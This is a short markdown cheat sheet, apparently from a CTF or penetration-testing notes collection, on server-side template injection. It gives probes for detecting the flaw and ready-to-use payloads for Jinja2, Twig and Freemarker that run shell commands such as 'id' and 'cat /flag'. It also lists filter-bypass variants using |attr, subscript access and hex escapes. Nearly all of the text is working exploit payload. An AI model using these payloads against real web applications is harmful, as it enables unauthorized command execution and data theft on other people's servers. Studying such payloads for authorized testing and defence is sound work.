# SSTI Bypass Playbook

## Detect

Input `{{7*7}}` rendered as `49`? Jinja2/Twig/Freemarker/etc.
- `{{7*'7'}}` → `7777777` (Python-ish → Jinja2) vs `49` (Java/Twig)
- `${7*7}` → `49` (Freemarker/Spring)

## Jinja2 RCE chain

Walk up the object graph to reach `os.popen`:

```
{{''.__class__.__mro__[1].__subclasses__()}}
```
Find a class with a useful import (index varies per version):
```
{{''.__class__.__mro__[1].__subclasses__()[<idx>].__init__.__globals__['os'].popen('cat /flag').read()}}
```

Shorter using `config`:
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Using `request.application`:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

## Sandbox escapes

If `{{ }}` filters `_` or `.`, try:
```
{{"".__class__}}                 # normal
{{''|attr('__class__')}}         # bypass via |attr
{{request['application']['__globals__']['os']['popen']('id')['read']()}}  # subscript
{{()["\x5f\x5fclass\x5f\x5f"]}}  # hex escapes
```

## Twig / Symfony

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

## Freemarker / Velocity (Java)

```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("id") }
```

## Payload templates

See `exploits/web/ssti_jinja2.py`.
